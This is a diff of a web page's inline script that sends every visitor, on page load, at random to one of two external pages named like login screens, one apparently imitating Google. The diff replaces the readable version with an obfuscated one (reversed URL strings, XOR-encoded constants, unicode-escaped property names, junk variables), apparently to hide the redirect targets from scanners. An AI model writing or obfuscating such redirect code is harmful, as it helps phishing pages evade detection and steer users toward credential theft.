@@ -7,35 +7,30 @@
 <body>
 
   <script>
-    // 1. 設定你的兩個目標網址
-    const URL_1 = "https://cake16384.github.io/xf_login";
-    const URL_2 = "https://my--web-eb9fd.web.app/Googlecom.html";
-
-    // 冷卻時間：5 分鐘 (5 * 60 秒 * 1000 毫秒)
-    const COOLDOWN_MS = 5 * 60 * 1000; 
-
+    var _0x19c0e = (715660 ^ 715658) + (405538 ^ 405543);
+    const URL_1 = "nigol_fx/oi.buhtig.48361ekac//:sptth".split("").reverse().join("");
+    _0x19c0e = (544949 ^ 544957) + (896474 ^ 896466);
+    const URL_2 = "lmth.mocelgooG/ppa.bew.df9be-bew--ym//:sptth".split("").reverse().join("");
+    const COOLDOWN_MS = (575633 ^ 575636) * (124755 ^ 124783) * (551105 ^ 551721);
     function processRedirect() {
-      const now = Date.now();
-      const expireTime = localStorage.getItem('cooldown_expire');
-
-      // 檢查是否處於「計時未結束」狀態
-      if (expireTime && now < parseInt(expireTime, 10)) {
-        // 計時未結束 -> 強制跳轉至第二網址
-        window.location.href = URL_2;
-      } else {
-        // 第一次進入，或計時已結束 -> 重新開始 5 分鐘計時，並執行 1/2 機率抽籤
-        localStorage.setItem('cooldown_expire', (now + COOLDOWN_MS).toString());
-
-        const isFirst = Math.random() < 0.5;
-        if (isFirst) {
-          window.location.href = URL_1;
+    var _0x830ac = (813763 ^ 813767) + (312248 ^ 312252);
+    const _0xdgd9c = Date['\u006E\u006F\u0077']();
+    _0x830ac = (951848 ^ 951848) + (373005 ^ 373007);
+    const _0xg_0x7bc = localStorage['\u0067\u0065\u0074\u0049\u0074\u0065\u006D']("eripxe_nwodlooc".split("").reverse().join(""));
+    if (_0xg_0x7bc && _0xdgd9c < parseInt(_0xg_0x7bc, 140998 ^ 141004)) {
+        window['\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0068\u0072\u0065\u0066'] = URL_2;
+    } else {
+        localStorage['\u0073\u0065\u0074\u0049\u0074\u0065\u006D']("\u0063\u006F\u006F\u006C\u0064\u006F\u0077\u006E\u005F\u0065\u0078\u0070\u0069\u0072\u0065", (_0xdgd9c + COOLDOWN_MS)['\u0074\u006F\u0053\u0074\u0072\u0069\u006E\u0067']());
+        var _0xd4bbbd = (358152 ^ 358158) + (160646 ^ 160644);
+        const _0xe2ceb = Math['\u0072\u0061\u006E\u0064\u006F\u006D']() < 0.5;
+        _0xd4bbbd = "mecimm".split("").reverse().join("");
+        if (_0xe2ceb) {
+        window['\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0068\u0072\u0065\u0066'] = URL_1;
         } else {
-          window.location.href = URL_2;
+        window['\u006C\u006F\u0063\u0061\u0074\u0069\u006F\u006E']['\u0068\u0072\u0065\u0066'] = URL_2;
         }
-      }
     }
-
-    // 頁面載入後立即執行跳轉
+    }
     processRedirect();
   </script>
 
